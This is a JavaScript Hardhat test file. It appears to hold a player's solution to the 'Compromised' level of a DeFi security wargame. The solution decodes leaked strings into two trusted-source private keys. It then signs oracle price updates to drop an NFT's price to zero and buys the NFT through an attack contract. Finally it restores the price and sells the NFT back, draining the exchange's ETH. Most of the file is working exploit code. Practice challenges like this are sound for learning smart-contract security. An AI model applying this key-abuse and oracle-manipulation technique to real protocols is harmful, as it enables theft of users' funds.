const { expect } = require('chai');
const { ethers } = require('hardhat');
const { setBalance } = require('@nomicfoundation/hardhat-network-helpers');

describe('Compromised challenge', function () {
    let deployer, player;
    let oracle, exchange, nftToken;

    const sources = [
        '0xA73209FB1a42495120166736362A1DfA9F95A105',
        '0xe92401A4d3af5E446d93D11EEc806b1462b39D15',
        '0x81A5D6E50C214044bE44cA0CB057fe119097850c'
    ];

    const EXCHANGE_INITIAL_ETH_BALANCE = 999n * 10n ** 18n;
    const INITIAL_NFT_PRICE = 999n * 10n ** 18n;
    const PLAYER_INITIAL_ETH_BALANCE = 1n * 10n ** 17n;
    const TRUSTED_SOURCE_INITIAL_ETH_BALANCE = 2n * 10n ** 18n;

    before(async function () {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
        [deployer, player] = await ethers.getSigners();
        
        // Initialize balance of the trusted source addresses
        for (let i = 0; i < sources.length; i++) {
            setBalance(sources[i], TRUSTED_SOURCE_INITIAL_ETH_BALANCE);
            expect(await ethers.provider.getBalance(sources[i])).to.equal(TRUSTED_SOURCE_INITIAL_ETH_BALANCE);
        }
        
        // Player starts with limited balance
        setBalance(player.address, PLAYER_INITIAL_ETH_BALANCE);
        expect(await ethers.provider.getBalance(player.address)).to.equal(PLAYER_INITIAL_ETH_BALANCE);
        
        // Deploy the oracle and setup the trusted sources with initial prices
        const TrustfulOracleInitializerFactory = await ethers.getContractFactory('TrustfulOracleInitializer', deployer);
        oracle = await (await ethers.getContractFactory('TrustfulOracle', deployer)).attach(
            await (await TrustfulOracleInitializerFactory.deploy(
                sources,
                ['DVNFT', 'DVNFT', 'DVNFT'],
                [INITIAL_NFT_PRICE, INITIAL_NFT_PRICE, INITIAL_NFT_PRICE]
            )).oracle()
        );

        // Deploy the exchange and get an instance to the associated ERC721 token
        exchange = await (await ethers.getContractFactory('Exchange', deployer)).deploy(
            oracle.address,
            { value: EXCHANGE_INITIAL_ETH_BALANCE }
        );
        nftToken = await (await ethers.getContractFactory('DamnValuableNFT', deployer)).attach(await exchange.token());
        expect(await nftToken.owner()).to.eq(ethers.constants.AddressZero); // ownership renounced
        expect(await nftToken.rolesOf(exchange.address)).to.eq(await nftToken.MINTER_ROLE());
    });

    it('Execution', async function () {
        /** CODE YOUR SOLUTION HERE */

        // From the challenge page we find Hex 2 strings as responcee from server
        //4d 48 68 6a 4e 6a 63 34 5a 57 59 78 59 57 45 30 4e 54 5a 6b 59 54 59 31 59 7a 5a 6d 59 7a 55 34 4e 6a 46 6b 4e 44 51 34 4f 54 4a 6a 5a 47 5a 68 59 7a 42 6a 4e 6d 4d 34 59 7a 49 31 4e 6a 42 69 5a 6a 42 6a 4f 57 5a 69 59 32 52 68 5a 54 4a 6d 4e 44 63 7a 4e 57 45 35
        //&
        //4d 48 67 79 4d 44 67 79 4e 44 4a 6a 4e 44 42 68 59 32 52 6d 59 54 6c 6c 5a 44 67 34 4f 57 55 32 4f 44 56 6a 4d 6a 4d 31 4e 44 64 68 59 32 4a 6c 5a 44 6c 69 5a 57 5a 6a 4e 6a 41 7a 4e 7a 46 6c 4f 54 67 33 4e 57 5a 69 59 32 51 33 4d 7a 59 7a 4e 44 42 69 59 6a 51 34
        // We can toss these in cyberchef to decode, from hex, it still looks messy afterwards:
        // MHhjNjc4ZWYxYWE0NTZkYTY1YzZmYzU4NjFkNDQ4OTJjZGZhYzBjNmM4YzI1NjBiZjBjOWZiY2RhZTJmNDczNWE5
        // MHgyMDgyNDJjNDBhY2RmYTllZDg4OWU2ODVjMjM1NDdhY2JlZDliZWZjNjAzNzFlOTg3NWZiY2Q3MzYzNDBiYjQ4
        // But if we mess around with these, can decode from base64 to get some interesting strings:
        //0xc678ef1aa456da65c6fc5861d44892cdfac0c6c8c2560bf0c9fbcdae2f4735a9
        //0x208242c40acdfa9ed889e685c23547acbed9befc60371e9875fbcd736340bb48
        //
        // Can we use these to sign transactions for our trusted oracle sources to adjust prices?
        // Asked chatGPT how to use these and it let me know to do the follwoing:
        const PRIVATE_KEY_1 = "0xc678ef1aa456da65c6fc5861d44892cdfac0c6c8c2560bf0c9fbcdae2f4735a9"
        const PRIVATE_KEY_2 = "0x208242c40acdfa9ed889e685c23547acbed9befc60371e9875fbcd736340bb48"

        // Create a Wallet object from the private key
        const wallet1 = new ethers.Wallet(PRIVATE_KEY_1, ethers.provider);
        const wallet2 = new ethers.Wallet(PRIVATE_KEY_2, ethers.provider);
        console.log({wallet1, wallet2})// We see here the addresses these private keys
        // are associated with... low and behold we have 2/3 of our sources
        // build tx for each of them to adjust prices back and forth
        const oracleAddress = oracle.address;
        const contractAbi = [
          "function postPrice(string calldata symbol, uint256 newPrice) external",
        ];
        const oracleContract = new ethers.Contract(oracleAddress, contractAbi, wallet1);
        const symbol = "DVNFT";
        const newPrice = ethers.utils.parseUnits("0", "wei");
        const oldPrice = ethers.utils.parseUnits("999000000000000000000", "wei");
        const data = oracleContract.interface.encodeFunctionData("postPrice", [symbol, newPrice]);

        // TX to reduce prices
        const tx = {
          to: oracleAddress,
          data: data,
          gasLimit: 300000,
          gasPrice: ethers.utils.parseUnits("10", "gwei"),
        }
        const tx1 = {
          to: oracleAddress,
          data: data,
          gasLimit: 300000,
          gasPrice: ethers.utils.parseUnits("10", "gwei"),
        }

        // Sign the transaction with the Wallet objects
        const signedTx = await wallet1.signTransaction(tx);
        const signedTx2 = await wallet2.signTransaction(tx1);

        // Send the signed transaction to the network
        const txResponse = await ethers.provider.sendTransaction(signedTx);
        const txResponse2 = await ethers.provider.sendTransaction(signedTx2);

        console.log({txResponse})
        console.log({txResponse2})
        console.log(await oracle.getAllPricesForSymbol('DVNFT'))
        console.log(await oracle.getMedianPrice('DVNFT'))
        console.log(await oracle.getPriceBySource('DVNFT', sources[0]))
        console.log(await oracle.getPriceBySource('DVNFT', sources[1]))
        console.log(await oracle.getPriceBySource('DVNFT', sources[2]))
        // Above output confirms I have adjusted prices, now I need to buyOne nft at deflated
        // price before cranking back up to sell
        const CompromisedHackFactory = await ethers.getContractFactory('CompromisedHack', player);
        let hackContract = await CompromisedHackFactory.deploy(exchange.address);
        
        // Call its attack functin we set up
        const value = ethers.utils.parseUnits("2", "wei");

        const tx6 = await hackContract.buyNFT({ value: value });
        console.log({tx6}) // Got the nft, now up price and sell back

        const data2 = oracleContract.interface.encodeFunctionData("postPrice", [symbol, oldPrice]);
        // TX to increase prices
        const tx2 = {
          to: oracleAddress,
          data: data2,
          gasLimit: 300000,
          gasPrice: ethers.utils.parseUnits("10", "gwei"),
          nonce: 1
        }
        const tx3 = {
          to: oracleAddress,
          data: data2,
          gasLimit: 300000,
          gasPrice: ethers.utils.parseUnits("10", "gwei"),
          nonce: 1
        };
        // Send the old price tx 
        const signedTx3 = await wallet1.signTransaction(tx2);
        const signedTx4 = await wallet2.signTransaction(tx3);
        const txResponse7 = await ethers.provider.sendTransaction(signedTx3);
        const txResponse8 = await ethers.provider.sendTransaction(signedTx4);
    
        console.log({txResponse7})
        console.log({txResponse8})
        // All back up in price
        console.log(await oracle.getMedianPrice('DVNFT'))
        console.log(await oracle.getPriceBySource('DVNFT', sources[0]))
        console.log(await oracle.getPriceBySource('DVNFT', sources[1]))
        console.log(await oracle.getPriceBySource('DVNFT', sources[2]))
        
        
        const tx9 = await hackContract.sellBack();
        console.log({tx9})// Should go through and we will pass
    });

    after(async function () {
        /** SUCCESS CONDITIONS - NO NEED TO CHANGE ANYTHING HERE */
        
        // Exchange must have lost all ETH
        expect(
            await ethers.provider.getBalance(exchange.address)
        ).to.be.eq(0);
        
        // Player's ETH balance must have significantly increased
        expect(
            await ethers.provider.getBalance(player.address)
        ).to.be.gt(EXCHANGE_INITIAL_ETH_BALANCE);
        
        // Player must not own any NFT
        expect(
            await nftToken.balanceOf(player.address)
        ).to.be.eq(0);

        // NFT price shouldn't have changed
        expect(
            await oracle.getMedianPrice('DVNFT')
        ).to.eq(INITIAL_NFT_PRICE);
    });
});
